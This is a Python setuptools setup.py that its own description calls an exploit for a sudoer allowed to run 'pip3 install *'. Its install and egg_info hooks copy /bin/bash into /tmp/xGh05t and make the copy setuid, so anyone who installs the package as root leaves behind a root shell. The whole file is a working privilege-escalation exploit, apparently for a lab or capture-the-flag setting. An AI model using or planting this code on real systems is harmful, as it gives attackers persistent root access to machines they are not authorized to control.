from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os

def RunCommand():
    os.system("mkdir -p /tmp/xGh05t")
    os.system("cp /bin/bash /tmp/xGh05t")
    os.system("chmod +sx /tmp/xGh05t/bash")

class RunInstallCommand(install):
    def run(self):
        RunCommand()
        install.run(self)

class RunEggInfoCommand(egg_info):
    def run(self):
        RunCommand()
        egg_info.run(self)

setup(
    name = "xGh05t_fakePip",
    description='This will exploit a sudoer able to /usr/bin/pip3 install *',
    packages=find_packages(),
    cmdclass={
        'install' : RunInstallCommand,
        'egg_info' : RunEggInfoCommand,
        }
    )
